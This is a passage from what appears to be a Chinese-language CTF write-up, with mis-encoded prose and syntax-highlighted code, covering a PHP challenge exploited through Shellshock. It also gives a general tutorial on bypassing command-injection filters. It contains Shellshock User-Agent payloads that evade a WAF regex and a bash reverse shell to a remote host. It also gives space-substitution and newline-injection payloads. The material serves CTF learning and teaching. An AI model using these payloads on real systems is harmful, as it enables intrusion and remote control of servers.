class="string">&#x27;env&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>($cmds <span class="keyword">as</span> $c) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=cmd&amp;cmd=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;</span>, $c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;func&quot;</span> value=<span class="string">&quot;cmd&quot;</span>&gt;</span><br><span class="line">  &lt;div class=&quot;input-group&quot;&gt;</span><br><span class="line">    &lt;input class=&quot;form-control&quot; type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;cmd&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;input-group-append&quot;&gt;</span><br><span class="line">      &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Execute&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;cmd.focus();&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;h2&gt;$ %s&lt;/h2&gt;&#x27;</span>, htmlentities($cmd));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">switch</span> ($cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;env&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;ls&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;ls -l&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;ls -al&#x27;</span>:</span><br><span class="line">            execute($cmd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;cat flag&#x27;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;cat-flag.png&quot; alt=&quot;cat flag&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printf(<span class="string">&#x27;%s: command not found&#x27;</span>, htmlentities($cmd));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ls.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $file = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        $file = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    $dirs = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;../..&#x27;</span>, <span class="string">&#x27;/etc/passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>($dirs <span class="keyword">as</span> $dir) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=ls&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;</span>, $dir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&#x27;&lt;h2&gt;$ ls %s&lt;/h2&gt;&#x27;</span>, htmlentities($file));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    execute(sprintf(<span class="string">&#x27;ls -l %s&#x27;</span>, escapeshellarg($file)));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>ls.php</code>æ¥æ‰¾<code>flag</code>äº†ï¼Œå› ä¸º<code>ls.php</code>æ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨<code>func=ls&amp;file=../../../</code>å¯ä»¥å‘ç°æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110130635.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘æ€ä¹ˆè¯»<code>flag</code>ã€<code>flag-reader</code>å’Œ<code>flag-reader.c</code>è¿™ä¸‰ä¸ªæ–‡ä»¶äº†ã€‚</p>
<p><code>untar.php</code>é»˜è®¤æ‰§è¡Œ<code>tar -tvf</code>å‘½ä»¤æ²¡æœ‰å¯åˆ©ç”¨çš„åœ°æ–¹ï¼Œ<code>man.php</code>æœ‰ç”¨æˆ·å¯æ§åˆ¶çš„å‚æ•°<code>file</code>ï¼Œä½†æ˜¯<code>preg_match('/^[\w\-]+$/', $file) !== 1</code>é™åˆ¶çš„æ¯”è¾ƒæ­»ï¼Œè€Œ<code>cmd.php</code>ç»™å‡ºäº†<code>env</code>å‘½ä»¤ï¼Œæ˜¾ç¤ºäº†å½“å‰bashçš„ç¯å¢ƒå˜é‡ï¼Œè€Œä¸”ï¼Œåœ¨<code>index.php</code>ä¸­ä¹Ÿæœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„PHPå‡½æ•°<code>putenv</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110135237.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æ¯”è¾ƒå®¹æ˜“è®©äººæƒ³åˆ°ä¹Ÿå¯ä»¥æ¯”è¾ƒå®¹æ˜“æœåˆ°<code>ShellShock</code>æ¼æ´ã€‚</p>
<blockquote>
<p><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">Bashç ´å£³æ¼æ´åŸç†ä»‹ç»</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$black_list = [</span><br><span class="line">    <span class="string">&#x27;\/flag&#x27;</span>, <span class="string">&#x27;\(\)\s*\&#123;\s*:;\s*\&#125;;&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$b</span>/&quot;</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">&quot;<span class="subst">$b</span> detected! exit now.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$cmd, $shell=<span class="string">&#x27;bash&#x27;</span></span>) </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">&#x27;%s -c %s&#x27;</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">&#x27;HTTP_&#x27;</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$val</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…³é”®å°±åœ¨<code>putenv</code>å‡½æ•°ï¼Œç”±äº<code>ShellShock</code>æ¼æ´ padyload éœ€è¦å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>putenv</code>å®ç°å‚æ•°ä¼ é€’ï¼Œç›´æ¥è®¾ç½®<code>User-agent: () &#123; :;&#125;; echo 222222</code>ï¼Œå‘ç°è¢« wafã€‚</p>
<blockquote>
<p>ä»æœ€åä¸€ä¸ªforeachä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä¼šæŠŠä»¥HTTP_å¼€å¤´çš„å…ƒç´ è®¾ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œåœ¨ä¸€æ¬¡HTTPè¯·æ±‚ä¸­ï¼Œæœ‰å¦‚ä¸‹å­—æ®µç¬¦åˆè¦æ±‚ï¼š</p>
<p>HTTP_ACCEPT_LANGUAGE: zh-CN,zh;q=0.9</p>
<p>HTTP_ACCEPT_ENCODING: gzip, deflate, br</p>
<p>HTTP_SEC_FETCH_MODE: navigate</p>
<p>HTTP_SEC_FETCH_SITE: cross-site HTTP_ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9</p>
<p>HTTP_SEC_FETCH_USER: ?1</p>
<p>HTTP_USER_AGENT: test</p>
<p>HTTP_UPGRADE_INSECURE_REQUESTS: 1</p>
<p>HTTP_CACHE_CONTROL: max-age=0</p>
<p>HTTP_CONNECTION: keep-alive</p>
<p>HTTP_HOST: localhost</p>
<p>è¿™é‡Œé¢HTTP_USER_AGENTæ¯”è¾ƒå¥½åˆ©ç”¨ã€‚</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200112162531.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200112162904.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æŸ¥çœ‹è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå‘ç°å¯ä»¥åœ¨ä¸­é—´çš„<code>&#125;;</code>ä¸­é—´åŠ ä¸€ä¸ªç©ºæ ¼ç»•è¿‡ï¼Œå³<code>User-agent: () &#123; : ;&#125;; echo test</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200112163450.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>å¯ä»¥æ­£å¸¸å›æ˜¾ï¼Œå†å›æ¥çœ‹é‚£ä¸‰ä¸ªæ–‡ä»¶ï¼Œ<code>flag</code>éœ€è¦rootæƒé™è¯»ï¼Œé‚£ä¹ˆå…ˆä»<code>flag-reader.c</code>ä¸‹æ‰‹ï¼Œè®¾ç½®<code>User-Agent: () &#123; : ;&#125;; cat /?lag-reader.c</code>ï¼Œå‘ç°<code>flag</code>è¢«å±è”½ï¼Œä½¿ç”¨<code>*</code>é€šé…ç¬¦ç»•è¿‡ï¼š<code>() &#123; : ;&#125;; /bin/cat /fla*.c</code>ï¼Œè¯»åˆ°flag-reader.cæ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">&quot;Not enough random\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	setuid(<span class="number">1337</span>);</span><br><span class="line">	seteuid(<span class="number">1337</span>);</span><br><span class="line">	alarm(<span class="number">1</span>);</span><br><span class="line">	write(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</span><br><span class="line">	read(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> s = read(fd, buff, <span class="number">1024</span>);</span><br><span class="line">			<span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				write(<span class="number">1</span>, buff, s);</span><br><span class="line">			&#125;</span><br><span class="line">			close(fd);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			write(<span class="number">1</span>, <span class="string">&quot;Can not open file\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">&quot;Wrong response\n&quot;</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®¡è®¡è¿™ä¸ªCæºç¨‹åºï¼Œå¤§è‡´åŸç†å°±æ˜¯ï¼š1ç§’ä¹‹å†…æŠŠä»–è¾“å‡ºçš„éšæœºå­—ç¬¦ä¸²å†è¾“å…¥å›å»ï¼Œå°±å¯ä»¥æ‰“å‡ºæ–‡ä»¶å†…å®¹ã€‚</p>
<p>æ‰€ä»¥ç›®æ ‡å°±æ˜¯é€šè¿‡<code>flag-reader flag</code>å‘½ä»¤æ¥è¯»å–<code>flag</code>æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellå’Œé‡å®šå‘æ¥è¾¾åˆ°è¿™ç›®çš„ï¼Œæˆ‘ä»¬å°†è¾“å‡ºå†™åˆ°æŸä¸ªæ–‡ä»¶ä¸­ï¼Œå†è‡ªåŠ¨è¾“å…¥å³å¯ã€‚</p>
<p>å…ˆé˜¿é‡Œäº‘ä¸Šç›‘å¬11000ç«¯å£ï¼Œå†åˆ©ç”¨shellshockæ¼æ´æ‰§è¡Œ<code>() &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1</code></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2549">åå¼¹shellå¯ä»¥çœ‹è¿™é‡Œ</a></p>
<p>åå¼¹shellè¿™é‡Œå¡äº†æˆ‘ä¸€å¤©çš„æ—¶é—´ï¼Œå‘½ä»¤åº”è¯¥æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œä½†æ˜¯å°±æ˜¯åœ¨é˜¿é‡Œäº‘ä¸»æœºä¸Šæ²¡æœ‰å›æ˜¾ï¼Œæœ€åå‘ç°ä¸ä»…è¦é…ç½®å®‰å…¨ç»„è¿˜è¦åœ¨centosä¸Šå¯¹å¼€æ”¾è¿™ä¸ªç«¯å£çš„é˜²ç«å¢™ã€‚</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115101951.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æˆ‘ä»¬å†å»æ‰¾å¯å†™ç›®å½•ï¼Œå‘ç° /var/tmpå…·æœ‰å†™æƒé™</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115113601.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æˆ‘ä»¬å†æ„é€ payloadï¼š<code>() &#123; : ; &#125;; flag-reader flag &gt; /var/tmp/ca01h &lt; /var/tmp/ca01h</code>ï¼ŒæŸ¥çœ‹<code>cat ca01h</code>ï¼Œå¾—åˆ°flagï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115103648.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h2 id="å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æ–¹å¼">å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æ–¹å¼</h2>
<h3 id="ç©ºæ ¼è¿‡æ»¤">ç©ºæ ¼è¿‡æ»¤</h3>
<p>ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä»£æ›¿ï¼š</p>
<p><code>%20(space)ã€%09(tab)ã€$IFS$9ã€ $&#123;IFS&#125;</code></p>
<p><code>$IFS</code>åœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„<code>cat$IFS2</code>,bashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œç„¶è€Œå¦‚æœåŠ ä¸€ä¸ª<code>&#123;&#125;</code>å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨<code>$9</code>å‘¢ï¼Œå› ä¸º<code>$9</code>åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p>
<h3 id="ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦">ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linuxä¸­ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</span><br><span class="line">windowsä¸­ï¼š%0aã€&amp;ã€|ã€%1aï¼ˆä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰</span><br></pre></td></tr></table></figure>
<ul>
<li>åœ¨ shell ä¸­ï¼Œæ‹…ä»»è¿ç»­æŒ‡ä»¤åŠŸèƒ½çš„ç¬¦å·å°±æ˜¯<code>;</code>ã€‚</li>
<li><code>&amp;</code>æ”¾åœ¨å¯åŠ¨å‚æ•°åé¢è¡¨ç¤ºè®¾ç½®æ­¤è¿›ç¨‹ä¸ºåå°è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿›ç¨‹æ˜¯å‰å°è¿›ç¨‹ï¼Œè¿™æ—¶å°±æŠŠShellç»™å æ®äº†ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œå…¶ä»–æ“ä½œï¼Œå¯¹äºé‚£äº›æ²¡æœ‰äº¤äº’çš„è¿›ç¨‹ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›å°†å…¶åœ¨åå°å¯åŠ¨ï¼Œå¯ä»¥åœ¨å¯åŠ¨å‚æ•°çš„æ—¶å€™åŠ ä¸€ä¸ª<code>&amp;</code>å®ç°è¿™ä¸ªç›®çš„ã€‚</li>
<li>ç®¡é“ç¬¦&quot;|&quot;å·¦è¾¹å‘½ä»¤çš„è¾“å‡ºå°±ä¼šä½œä¸ºç®¡é“ç¬¦å³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œæ‰€ä»¥å·¦è¾¹çš„è¾“å‡ºå¹¶ä¸æ˜¾ç¤ºã€‚</li>
</ul>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå®ä¾‹ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file_name = $_GET[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^[\/a-zA-Z0-9-_\\s]+.rpt$/m&quot;</span>, $file_name)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;regex failed&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> exec(<span class="string">&quot;/usr/bin/file -i -b &quot;</span> . $file_name);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115181431.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>è¿™ä¸ªç¨‹åºçš„å«ä¹‰å°±æ˜¯åŒ¹é…æ–‡ä»¶åç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€ç ´åˆ™å·ã€æ–œæ ã€ç©ºç™½å­—ç¬¦å„ç§ç»„åˆçš„å¹¶ä¸”åç¼€åæ˜¯rptçš„æ–‡ä»¶ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œå°±æ‰§è¡Œç³»ç»Ÿå‘½ä»¤fileæ‰“å°æ–‡ä»¶çš„ç±»å‹å’Œç¼–ç ä¿¡æ¯ï¼Œå¦‚æœåŒ¹é…å¤±è´¥å°±æ‰“å°â€™regex failedâ€™ã€‚</p>
<p>æ”»å‡»ç‚¹åœ¨<code>\\s</code>æ­£åˆ™è¿‡æ»¤ä¸Šï¼Œ<code>\\s </code>æ„æ€æ˜¯åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼Œä½•ä¸ºç©ºç™½å­—ç¬¦ï¼Œå°±æ˜¯å¸¸è§çš„[trnf] (Tabã€å›è½¦ã€æ¢è¡Œã€æ¢é¡µ)ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œè¿™é‡Œæ¢è¡Œç¬¦å°±å¾ˆå±é™©ï¼Œæ¢è¡Œç¬¦åœ¨å…¶ä»–åœºæ™¯å¯èƒ½æ²¡æœ‰é£é™©ï¼Œä½†æ˜¯åœ¨shellç¯å¢ƒä¸‹ï¼Œå°±æœ‰å¯èƒ½é€ æˆå‘½ä»¤æ³¨å…¥ï¼Œçœ‹çœ‹ä¸‹é¢è¿™æ®µpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file%0aid%0a.rpt</span><br></pre></td></tr></table></figure>
<p>%0aæ˜¯URLç¼–ç åçš„æ¢è¡Œç¬¦ï¼Œåœ¨shellçš„ç¯å¢ƒä¸­æ‰§è¡Œï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115231711.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>å› ä¸ºåœ¨shellç¯å¢ƒä¸­å¤šä¸ªå‘½ä»¤çš„åˆ†éš”ç¬¦é™¤äº†;ä¹‹å¤–è¿˜æœ‰æ¢è¡Œç¬¦ï¼Œä¸Šè¿°payload ä¼ å…¥shellä¹‹åï¼Œå°±å˜æˆä¸¤æ¡å‘½ä»¤æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file -i -b file%0A</span><br><span class="line">id%0A</span><br><span class="line">.rpt</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å°±å‡ºç°äº†æ‰“å°idå‘½ä»¤æ‰§è¡Œçš„å†…å®¹ã€‚</p>
<p>è¦è§£å†³è¿™ä¸ªç»•è¿‡å¯ä»¥æŠŠ<code>\\s</code>ç›´æ¥æ¢æˆç©ºæ ¼ï¼Œå³<code>preg_match(&quot;/^[\/a-zA-Z0-9-_ ]+.rpt$/m&quot;, $file_name)</code>ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥æ„é€ payloadæ¥æ³¨å…¥å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file.rpt%0aid</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115232845.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>åœ¨phpä¸­ï¼Œ/mè¡¨ç¤ºå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ï¼Œå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ä¹‹å^å’Œ$çš„å«ä¹‰å°±å‘ç”Ÿäº†å˜åŒ–ï¼Œæ²¡å¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹å‰(å³å•è¡ŒåŒ¹é…æ¨¡å¼), ^ å’Œ$ æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾ï¼Œå¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹åï¼Œå¤šè¡Œæ¨¡å¼^,$å¯ä»¥åŒ¹é…æ¯è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œæ‰€ä»¥ä¸Šè¿°payloadé‡Œé¢å«æœ‰æ¢è¡Œç¬¦ï¼Œè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œä¸€è¡ŒåŒ¹é…OKå³å¯ï¼Œæ‰€ä»¥è¿›å…¥äº†execæ‰§è¡Œåˆ†æ”¯ï¼Œè¿›è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p>
